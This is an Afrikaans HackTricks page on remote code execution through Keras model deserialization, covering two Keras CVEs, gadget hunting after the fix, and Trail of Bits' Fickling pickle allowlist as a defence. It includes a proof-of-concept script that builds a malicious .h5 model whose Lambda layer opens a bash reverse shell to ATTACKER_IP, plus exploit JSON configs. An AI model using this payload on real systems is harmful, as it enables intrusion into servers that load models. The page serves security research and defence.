# Keras Model Deserialization RCE and Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

Hierdie bladsy som praktiese uitbuitingstegnieke teen die Keras-model-deserialiseringspyplyn op, verduidelik die interne werking en attack surface van die native .keras-formaat, en verskaf ’n navorsernutsgoedstel vir die vind van Model File Vulnerabilities (MFVs) en post-fix gadgets.

## Interne werking van die .keras-modelformaat

’n .keras-lêer is ’n ZIP-argief wat minstens die volgende bevat:<sup>[[1]](#references)</sup>
- metadata.json – algemene inligting (bv. Keras-weergawe)
- config.json – modelargitektuur (primêre attack surface)
- model.weights.h5 – gewigte in HDF5

Die config.json dryf rekursiewe deserialisering aan: Keras voer modules in, los klasse/funksies op en rekonstrueer lae/objekte vanaf aanvaller-beheerde woordeboeke.<sup>[[1]](#references)</sup>

Voorbeeldbrokkie vir ’n Dense-laagobjek:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
Deserialisering voer die volgende uit:<sup>[[1]](#references)</sup>
- Module-import en simboolresolusie vanaf module/class_name-sleutels
- from_config(...) of konstruktor-aanroeping met aanvaller-beheerde kwargs
- Rekursie in geneste objekte (activations, initializers, constraints, ens.)

Histories het dit drie primitiewe aan 'n aanvaller blootgestel wat config.json saamstel:<sup>[[1]](#references)</sup>
- Beheer oor watter modules ingevoer word
- Beheer oor watter klasse/funksies opgelos word
- Beheer oor kwargs wat aan konstrukteurs/from_config deurgegee word

## CVE-2024-3660 – Lambda-layer bytecode RCE

Grondoorsaak:
- Legacy Lambda-deserialisering het 'n Python-funksie vanaf aanvaller-beheerde gemarshalde kode gerekonstrueer: `func_load()` dekodeer die payload vanaf base64, roep `marshal.loads()` aan en skep 'n `FunctionType`. Die resulterende funksie se bytecode word uitgevoer wanneer die Lambda aangeroep word, en geaffekteerde loaders voor 2.13 het nie safe-mode-kontroles vir legacy-formate afgedwing nie.<sup>[[3]](#references)[[16]](#references)[[17]](#references)[[18]](#references)</sup>

In 'n native Keras v3-argief word die Lambda-funksie as 'n `__lambda__`-objek voorgestel waarvan die `code`-veld gemarshalde kode bevat wat met base64 geënkodeer is:<sup>[[17]](#references)[[18]](#references)</sup>
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"class_name": "__lambda__",
"config": {
"code": "<base64(marshal.dumps(function.__code__))>",
"defaults": null,
"closure": null
}
}
}
}
```
Versagting:
- Keras dwing by verstek `safe_mode=True` af vir die native Keras v3-formaat. Geserialiseerde Python-lambdas in `Lambda` word geblokkeer, tensy ’n gebruiker uitdruklik met `safe_mode=False` daarvan afsien; hierdie beskerming dek legacy-formate nie op dieselfde manier nie.<sup>[[1]](#references)[[16]](#references)[[17]](#references)</sup>

Notas:
- Legacy-formate (ouer HDF5-stoorbewerkings) of ouer codebases dwing moontlik nie moderne kontroles af nie, dus kan “downgrade”-styl attacks steeds toegepas word wanneer victims ouer loaders gebruik.

## CVE-2025-1550 – Arbitrary module import in Keras 3.0.0–3.8.x

Oorsaak:
- `_retrieve_class_or_fn` het `importlib.import_module(module)` op attacker-controlled module strings uit `config.json` gebruik.
- Impak: ’n Crafted `.keras`-argief kon veroorsaak dat `Model.load_model()` attacker-selected Python-modules en -funksies importeer, met import-time side effects en attacker-controlled arguments, selfs met `safe_mode=True`.<sup>[[1]](#references)[[4]](#references)</sup>

Exploit-idee:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Sekuriteitsverbeterings (Keras ≥ 3.9):<sup>[[1]](#references)[[2]](#references)</sup>
- Module-allowlist: imports beperk tot amptelike ekosisteemmodules: keras, keras_hub, keras_cv, keras_nlp
- Veilige modus by verstek: safe_mode=True blokkeer die laai van onveilige Lambda-geserialiseerde funksies
- Basiese tipekontrolering: gedeserialiseerde objekte moet met die verwagte tipes ooreenstem

## Praktiese uitbuiting: TensorFlow-Keras HDF5 (.h5) Lambda RCE

Verouderde TensorFlow-Keras-deployments aanvaar moontlik steeds HDF5-modelle (`.h5`). As ’n aanvaller ’n model kan oplaai wat die server later laai of waarop dit inferensie uitvoer, kan ’n kwesbare loader ’n Lambda-laag deserialiseer wat aanvaller-beheerde Python bevat, wat dan in die toepassing se model-werkvloei uitgevoer kan word.<sup>[[3]](#references)[[7]](#references)[[16]](#references)</sup>

Minimale PoC om ’n kwaadwillige .h5 te skep waarvan die Lambda ’n reverse shell uitvoer wanneer die teiken die model aanroep:
```python
import tensorflow as tf

def exploit(x):
import os
os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```
Notas en betroubaarheidswenke:
- Snellerpunte verskil volgens formaat en werksvloei; die verwysde skrywe het waargeneem dat die payload twee keer tydens prediction uitgevoer word. Behandel side effects as herhaalbaar en maak payloads idempotent.<sup>[[7]](#references)</sup>
- Weergawevaspenning: pas die slagoffer se TF/Keras/Python by om serialiseringswanpassings te vermy. Bou byvoorbeeld artifacts onder Python 3.8 met TensorFlow 2.13.1 as dit is wat die teiken gebruik.<sup>[[7]](#references)</sup>
- Vinnige omgewingsreplikasie:
```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```
- Validasie: ’n onskadelike payload soos `os.system("ping -c 1 YOUR_IP")` help om uitvoering te bevestig (bv. deur ICMP met tcpdump waar te neem) voordat daar na ’n reverse shell oorgeskakel word.<sup>[[7]](#references)</sup>

## Gadget-oppervlak binne allowlist ná regstelling

Selfs met die Keras-module-allowlist en safe mode kan toegelate callables newe-effekte blootstel. Byvoorbeeld, `keras.utils.get_file` laai ’n URL af en skryf dit onder die gekonfigureerde cache-ligging, wat dit ’n kandidaat vir gadget-analise maak.<sup>[[1]](#references)[[19]](#references)</sup>

Kandidaat Lambda-konfigurasie (valideer die call signature in ’n beheerde toets):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {
"module": "keras.utils",
"class_name": "get_file",
"config": null,
"registered_name": null
},
"arguments": {
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Belangrike beperking:
- `Lambda.call()` gee altyd die modelinvoer as die eerste posisionele argument en die gekonfigureerde `arguments` as sleutelwoordargumente deur. Vir `get_file` vul daardie posisionele waarde `fname`; ’n tensor-/pad-wanpassing kan veroorsaak dat hierdie kandidaat misluk voordat enige aflaai plaasvind, dus is dit nie ’n gewaarborgde werkende gadget nie.<sup>[[1]](#references)[[16]](#references)[[19]](#references)</sup>

## ML pickle-importtoelatingslys vir AI/ML-modelle (Fickling)

Baie AI/ML-modelformate (PyTorch `.pt`/`.pth`/`.ckpt`, joblib/scikit-learn-artifacts en ander Python-native formate) bevat Python-pickle-data. Die verouderde Keras Lambda-pad hierbo gebruik eerder gemarshalde funksie-bytecode, dus is dit ’n afsonderlike deserialiseringsrisiko. Pickle-opkodes kan aanvallerbeheerde gedrag tydens deserialisering uitvoer, insluitend modelsabotasie of RCE, en eenvoudige skandeerders kan nuwe of ongelyste gevaarlike imports miskyk.<sup>[[7]](#references)[[8]](#references)[[14]](#references)[[18]](#references)</sup>

’n Praktiese fail-closed verdediging is om Python se pickle-deserialiseerder te hook en slegs ’n nagegane stel onskadelike ML-verwante imports tydens unpickling toe te laat. Trail of Bits se Fickling implementeer hierdie beleid en verskaf ’n saamgestelde ML-importtoelatingslys wat uit duisende publieke Hugging Face-pickles opgebou is.<sup>[[8]](#references)[[13]](#references)</sup>

Sekuriteitsmodel vir “veilige” imports (intuïsies wat uit navorsing en praktyk afgelei is): simbole wat deur ’n pickle gebruik word, moet gelyktydig:<sup>[[8]](#references)</sup>
- Nie kode uitvoer of uitvoering veroorsaak nie (geen saamgestelde/bron-kode-objekte, uitroeping van shell-opdragte, hooks, ensovoorts nie)
- Nie arbitrêre attribute of items kry/stel nie
- Nie ander Python-objekte vanuit die pickle-VM importeer of verwysings daarna verkry nie
- Geen sekondêre deserialiseerders (bv. marshal, geneste pickle) aktiveer nie, selfs nie indirek nie

Aktiveer Fickling se beskerming so vroeg as moontlik tydens prosesbegin, sodat enige pickle-loads wat deur frameworks uitgevoer word (torch.load, joblib.load, ens.) nagegaan word:<sup>[[9]](#references)</sup>
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
Operasionele wenke:
- Jy kan die hooks tydelik deaktiveer/heraktiveer waar nodig:<sup>[[9]](#references)</sup>
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- As ’n bekende-goeie model geblokkeer word, brei die allowlist vir jou omgewing uit nadat jy die simbole nagegaan het:<sup>[[9]](#references)</sup>
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- Fickling bied ook generiese runtime guards as jy meer fynkorrelige beheer verkies:<sup>[[9]](#references)</sup>
- fickling.always_check_safety() om checks vir alle pickle.load() af te dwing
- with fickling.check_safety(): vir beperkte afdwinging
- fickling.load(path) / fickling.is_likely_safe(path) vir eenmalige checks

- Verkies non-pickle-modelformate waar moontlik (bv. SafeTensors).<sup>[[15]](#references)</sup> As jy pickle móét aanvaar, laat loop loaders met least privilege, sonder network egress, en dwing die allowlist af.

Hierdie allowlist-first-strategie blokkeer aantoonbaar algemene ML-pickle-exploitpaaie, terwyl dit hoë compatibility behou. In ToB se benchmark het Fickling 100% van sintetiese malicious files gemerk en ongeveer 99% van clean files vanaf top Hugging Face-repos toegelaat.<sup>[[8]](#references)[[10]](#references)</sup>


## Navorsers se toolkit

1) Sistematiese gadget discovery in toegelate modules

Lys kandidaat-callables oor keras, keras_nlp, keras_cv, keras_hub en prioritiseer dié met file/network/process/env-newe-effekte.<sup>[[1]](#references)</sup>

<details>
<summary>Lys potensieel gevaarlike callables in allowlisted Keras-modules</summary>
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
</details>

2) Direkte deserialization-toetsing (geen .keras-argief nodig nie)

Voer vervaardigde dicts direk in Keras-deserializers in om aanvaarbare params te bepaal en newe-effekte waar te neem.<sup>[[1]](#references)</sup>
```python
import keras

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {
"module": "keras.utils",
"class_name": "get_file",
"config": null,
"registered_name": null
},
"arguments": {
"origin": "https://example.com/x",
"cache_dir": "/tmp/keras-cache"
}
}
}

layer = keras.saving.deserialize_keras_object(cfg, safe_mode=True)  # Observe behavior
```
3) Kruisweergawesondersoek en formate

Keras bestaan in verskeie codebases/eras met verskillende guardrails en formate:<sup>[[1]](#references)</sup>
- TensorFlow built-in Keras: tensorflow/python/keras (legacy, geskeduleer vir verwydering)
- tf-keras: apart onderhou
- Multi-backend Keras 3 (official): native .keras bekendgestel

Herhaal toetse oor codebases en formate (.keras teenoor legacy HDF5) om regressies of ontbrekende guards bloot te lê.

## References

- [1] [Soek na kwesbaarhede in Keras Model Deserialization (huntr-blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [2] [Keras PR #20751 – Kontroles by serialisering gevoeg](https://github.com/keras-team/keras/pull/20751)
- [3] [CVE-2024-3660 – Keras Lambda-deserialisering RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [4] [CVE-2025-1550 – Keras arbitrary module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [5] [huntr-verslag – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [6] [huntr-verslag – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [7] [HTB Artificial – TensorFlow .h5 Lambda RCE na root](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [8] [Trail of Bits-blog – Fickling se nuwe AI/ML pickle file scanner](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [9] [Fickling – Beveiliging van AI/ML-omgewings (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [10] [Fickling pickle-skandering-benchmarkkorpus](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [11] [Picklescan](https://github.com/mmaitre314/picklescan)
- [12] [ModelScan](https://github.com/protectai/modelscan)
- [13] [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [14] [Agtergrond oor Sleepy Pickle-aanvalle](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [15] [SafeTensors-projek](https://github.com/safetensors/safetensors)
- [16] [CERT/CC VU#253266 – Keras 2 Lambda Layers laat arbitrary code injection toe](https://kb.cert.org/vuls/id/253266)
- [17] [Keras Lambda layer-bronkode (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/layers/core/lambda_layer.py)
- [18] [Keras Python utilities-bronkode (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/utils/python_utils.py)
- [19] [Keras `get_file` API](https://keras.io/api/utils/python_utils/#get_file-function)
{{#include ../../banners/hacktricks-training.md}}
